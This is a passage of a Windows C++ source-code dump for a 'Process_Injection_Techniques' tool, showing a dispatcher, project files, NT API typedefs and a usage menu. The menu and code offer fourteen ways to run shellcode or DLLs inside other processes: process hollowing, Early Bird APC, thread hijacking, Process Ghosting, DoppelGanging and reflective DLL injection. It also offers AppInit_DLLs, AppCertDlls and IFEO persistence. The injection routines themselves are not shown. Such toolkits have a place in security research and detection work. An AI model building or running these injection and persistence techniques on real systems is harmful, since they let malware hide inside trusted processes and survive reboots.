            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 5:
        Result = InjectUsingEarlyBirdAPC(ProcessName, ShellCodePath);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 6:
        Result = InjectUsingTLSCallBack(ProcessID, ShellCodePath, ProcessName);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;
    
    case 7:
        Result = InjectUsingThreadExecutionHijacking(ProcessID, ShellCodePath);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 8:
        Result = InjectUsingProcessHollowing(ProcessName, SourceProcessName);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 9:
        Result = InjectUsingAppInit_DLLs(DLLPath);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 10:
        Result = InjectUsingImageFileExecutionOptions(ProcessName, SourceProcessName);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 11:
        Result = InjectUsingAppCertDlls(DLLPath);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 12:
        Result = InjectUsingProcessGhosting(ProcessName, SourceProcessName);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 13:
        Result = InjectUsingReflectiveDLLInjection(ProcessID, DLLPath);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    case 14:
        Result = InjectUsingProcessDoppelGanging(ProcessName, SourceProcessName);
        if (Result == -1) {
            printf("Injection Failed\n");
        }
        else {
            printf("Injection Succeeded\n");
        }
        break;

    default:
        PrintUsage();
        break;
    }
	return 0;
}

```

`Process_Injection_Techniques/Process_Injection_Techniques/Process_Injection_Techniques.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{1a2fdd66-71f5-44e0-9f03-4966ca5117df}</ProjectGuid>
    <RootNamespace>ProcessInjectionTechniques</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Process_Injection_Techniques.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Injection.h" />
    <ClInclude Include="Struct.h" />
    <ClInclude Include="Utiliti.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Process_Injection_Techniques/Process_Injection_Techniques/Process_Injection_Techniques.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Process_Injection_Techniques.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Utiliti.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Injection.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Struct.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Process_Injection_Techniques/Process_Injection_Techniques/Struct.h`:

```h
#pragma once

#define BUFFER_SIZE 0x2000
#define NtCurrentProcess() ((HANDLE) -1)
#define NtCurrentThread()  ((HANDLE) -2)
#define PS_INHERIT_HANDLES            4
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#define STATUS_IMAGE_MACHINE_TYPE_MISMATCH ((NTSTATUS)0x4000000EL)


typedef struct _FILE_DISPOSITION_INFORMATION {
	BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, * PFILE_DISPOSITION_INFORMATION;

typedef struct _PEB_FREE_BLOCK {
	_PEB_FREE_BLOCK* Next;
	ULONG                   Size;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef void (*PPEBLOCKROUTINE)(
	PVOID PebLock
	);
typedef struct _PEBmy {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBaseAddress;
	PPEB_LDR_DATA           LoaderData;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PPEBLOCKROUTINE         FastPebLockRoutine;
	PPEBLOCKROUTINE         FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PPEB_FREE_BLOCK         FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID**					ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEBmy, * PPEBmy;

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

#define CountRelocationEntries(dwBlockSize)		\
	(dwBlockSize -								\
	sizeof(BASE_RELOCATION_BLOCK)) /			\
	sizeof(BASE_RELOCATION_ENTRY)

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT Flags;
	USHORT Length;
	ULONG  TimeStamp;
	STRING DosPath;

} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;

} CURDIR, * PCURDIR;
typedef struct _RTL_USER_PROCESS_PARAMETERSMy
{
	ULONG MaximumLength;                            // Should be set before call RtlCreateProcessParameters
	ULONG Length;                                   // Length of valid structure
	ULONG Flags;                                    // Currently only PPF_NORMALIZED (1) is known:
													//  - Means that structure is normalized by call RtlNormalizeProcessParameters
	ULONG DebugFlags;

	PVOID ConsoleHandle;                            // HWND to console window associated with process (if any).
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;                        // Specified in DOS-like symbolic link path, ex: "C:/WinNT/SYSTEM32"
	UNICODE_STRING DllPath;                         // DOS-like paths separated by ';' where system should search for DLL files.
	UNICODE_STRING ImagePathName;                   // Full path in DOS-like format to process'es file image.
	UNICODE_STRING CommandLine;                     // Command line
	PVOID Environment;                              // Pointer to environment block (see RtlCreateEnvironment)
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;                            // Fill attribute for console window
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;                     // Name of WindowStation and Desktop objects, where process is assigned
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[0x20];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERSMy, * PRTL_USER_PROCESS_PARAMETERSMy;


typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	DWORD64 SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI* _NtCreateProcessEx)
(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK  DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes  OPTIONAL,
	IN HANDLE   ParentProcess,
	IN ULONG    Flags,
	IN HANDLE   SectionHandle OPTIONAL,
	IN HANDLE   DebugPort OPTIONAL,
	IN HANDLE   ExceptionPort OPTIONAL,
	IN BOOLEAN  InJob
	) ;

typedef NTSTATUS(WINAPI* _RtlCreateProcessParametersEx)(
	_Out_ PRTL_USER_PROCESS_PARAMETERSMy* pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags // pass RTL_USER_PROC_PARAMS_NORMALIZED to keep parameters normalized
	) ;

typedef NTSTATUS(WINAPI* _NtCreateThreadEx) (
	OUT  PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	IN  PVOID StartRoutine,
	IN  PVOID Argument OPTIONAL,
	IN  ULONG CreateFlags,
	IN  ULONG_PTR ZeroBits,
	IN  SIZE_T StackSize OPTIONAL,
	IN  SIZE_T MaximumStackSize OPTIONAL,
	IN  PVOID AttributeList OPTIONAL
	) ;


typedef NTSTATUS (WINAPI* _NtSetInformationFile)(
	IN HANDLE FileHandle,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass
);

typedef NTSTATUS(WINAPI* _NtWriteFile)(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PVOID Buffer,
	IN ULONG Length,
	IN PLARGE_INTEGER ByteOffset OPTIONAL,
	IN PULONG Key OPTIONAL
);

typedef NTSTATUS(WINAPI* _NtCreateSection)(
	OUT PHANDLE SectionHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  PLARGE_INTEGER MaximumSize OPTIONAL,
	IN  ULONG SectionPageProtection,
	IN  ULONG AllocationAttributes,
	IN  HANDLE FileHandle OPTIONAL
);

typedef NTSTATUS(WINAPI* _NtClose)(
	IN  HANDLE Handle
);
```

`Process_Injection_Techniques/Process_Injection_Techniques/Utiliti.h`:

```h
#pragma once

#pragma warning(disable : 4996)

#include "Struct.h"

struct PROCESS_INFO
{
    DWORD PID;
    HANDLE MainThreadHandle;
};

struct MODULE_INFO
{
    DWORD MainModuleSize;
    BYTE* MainModuleAddress;
};

#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)


DWORD TypeofInjection;
DWORD ProcessID;
WCHAR DLLPath[MAX_PATH];
WCHAR ExportFunctionName[MAX_PATH];
WCHAR ProcessName[MAX_PATH];
WCHAR SourceProcessName[MAX_PATH];
WCHAR ShellCodePath[MAX_PATH];

void PrintUsage();
void ParseCommandLineArgument(int argc, WCHAR* argv[]);
DWORD GetIndexFromCommndLineArgument(int argc, WCHAR* argv[], CONST WCHAR ArgumentValue[]);
DWORD GetProcessIDFromName(WCHAR* ProcName);
BYTE* ReadDataFromFile(WCHAR* FileName);
BOOL StartExecutable(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo, DWORD CreationFlag);
void ResumeProcess(HANDLE hThread);
void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo);
int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo, BYTE* ShellCode,DWORD ShellCodeSize);
PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase);
PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase);
char* GetDLLName(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor);
IMAGE_DATA_DIRECTORY  GetImportDirectory(PIMAGE_NT_HEADERS pFileHeader);
PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IMAGE_DATA_DIRECTORY ImportDirectory);
DWORD64  FindRemotePEB(HANDLE hProcess);
PEBmy*  ReadRemotePEB(HANDLE hProcess);
PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress);
WORD GetPEFileArchitecture(BYTE* dwImageBase);
DWORD GetEntryPointRVA(BYTE* dwImageBase);
HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payladBuf, DWORD payloadSize);
BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath);
LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect);
BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi);
DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParameter);
HANDLE MakeTransactedSection(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize);
DWORD CreateProcessFromSecion(HANDLE hSection, BYTE* PayloadData, WCHAR* TargetProcessName);

void PrintUsage() {
    printf("Usage: Process_Injection_Techniques.exe <Type of injection 1-9> <Flags>\n");
    printf("============================================\n");
    printf("Types Of injection and its flages\n");
    printf("============================================\n");
    
    printf("Inject Dll in another process using CreateRemoteThread API\n");
    printf("Process_Injection_Techniques.exe 1 -p <PID> -d <Dll Full Path>\n\n");
    
    printf("Inject Dll in another process using SetWindowsHookExW API.\nNOTE: the target process should has GUI to load the dll in it, and the exprted function should check in what process it runs in before doing its work\n");
    printf("Process_Injection_Techniques.exe 2  -d <Dll Full Path> -e <Export Function name it the Dll>\n\n");
    
    printf("Inject ShellCode in another process using CreateRemoteThread API\n");
    printf("Process_Injection_Techniques.exe 3 -p <PID> -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using QueueUserAPC API.\nNOTE: the shellcode should handle the fact it will run more that once (# of threads in the process in the time of injection)\n");
    printf("Process_Injection_Techniques.exe 4 -p <PID> -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using Early Bird Technique\n");
    printf("Process_Injection_Techniques.exe 5 -n <Executable Full Path> -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using TLS CallBack Technique.\nNOTE: the executable that you try to inject should containg TLS Callback section.\nTODO: If the executble does not has TLS Section Create new one and edit PE header.\n");
    printf("You Can inject running process the TLS Callback will be trigered when new thread is created or when thread exits, or you can start application and make it run your TLS before its EntryPoint\n");
    printf("Process_Injection_Techniques.exe 6 {-p <PID> OR -n <Executable Full Path>} -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using Thread execution hijacking\n");
    printf("Process_Injection_Techniques.exe 7 -p <PID> -s <ShellCode Full Path>\n\n");

    printf("Inject PE in another process using Process Hollowing\n");
    printf("Note:Crash with some 64bit executable (like Syste32\Svchost.exe,..)\n");
    printf("Process_Injection_Techniques.exe 8 -t <Target Executable Full Path to inject> -n <Source Executable Full Path to be injected>\n\n");

    printf("Inject Dll in All process that uses User32.dll(GUI Executable), Will Work also as persistence technique\n");
    printf("Note:Will not work when Secure Boot is On\n");
    printf("Process_Injection_Techniques.exe 9 -d <DLL Full Path>\n\n");

    printf("Execute your Process when the target process start, Will Work also as persistence technique\n");
    printf("Process_Injection_Techniques.exe 10 -n <Target Process name> -d <Your Executable Path>\n\n");

    printf("Inject Dll in All process that Calls (CreateProcess*, WinExe,..) and can prevent process from creation by return Error Code, Will Work also as persistence technique\n");
    printf("Note:The Dll Must Export CreateProcessNotify(LPCWSTR lpApplicationName, REASON enReason) as this function will be called, See Refrence[1] in the README\n");
    printf("Process_Injection_Techniques.exe 11 -d <DLL Full Path>\n\n");

    printf("inject process inside other process using Process Ghosting\n");
    printf("Process_Injection_Techniques.exe 12 -n <Target Executable> -d <your payload path>\n\n");

    printf("inject process inside other process using Reflective DLL Injection\n");
    printf("Note:The Dll Should Depend only on kernel32.dll and ntdll.dll for stability, as they are loaded at the same base address for all processes on the system, See Refrence[6] in the README for more info\n");
    printf("Process_Injection_Techniques.exe 13 -p <PID> -d <your payload path>\n\n");

    printf("inject process inside other process using Process DoppelGanging\n");
    printf("Note: it does not work on windows 10\n");
    printf("Process_Injection_Techniques.exe 14 -n <Target Process name> -d <Your Executable Path>\n\n");
}

void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
    int InjectionType = _wtoi(argv[1]);
    int index = 0;
    switch (InjectionType) {
    case 1:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;

    case 2:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(ExportFunctionName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-e");
        wcscpy(DLLPath, argv[index]);
        break;

    case 3:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 4:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 5:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 6:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        if (index == -1) {
            printf("Suppy Argument for the %S Switch\n", L"-s");
            exit(0);
        }
        wcscpy(ShellCodePath, argv[index]);

        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        if (index == -1) {
            index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
            if (index == -1) {
                printf("Suppy -p <PID> or -n <Executable> to inject\n");
                exit(0);
            }
            wcscpy(ProcessName, argv[index]);
            break;
        }
        ProcessID = _wtoi(argv[index]);

        break;

    case 7:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 8:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-t");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(SourceProcessName, argv[index]);
        break;

    case 9:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;
    
    case 10:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(SourceProcessName, argv[index]);
        break;

    case 11:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;

    case 12:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(SourceProcessName, argv[index]);
        break;

    case 13:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;

    case 14:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(SourceProcessName, argv[index]);
        break;

    default:
        PrintUsage();
        exit(0);
        break;
    }
}

DWORD GetIndexFromCommndLineArgument(int argc, WCHAR* argv[], CONST WCHAR ArgumentValue[]) {
    for (int i = 0; i < argc; i++) {
        if (wcscmp(argv[i], ArgumentValue) == 0 && i < argc - 1) {
            return i + 1;
        }
    }
    int InjectionType = _wtoi(argv[1]);
    if (InjectionType != 6) {
        printf("Suppy Argument for the %S Switch\n", ArgumentValue);
        exit(0);
    }
    return -1;
}

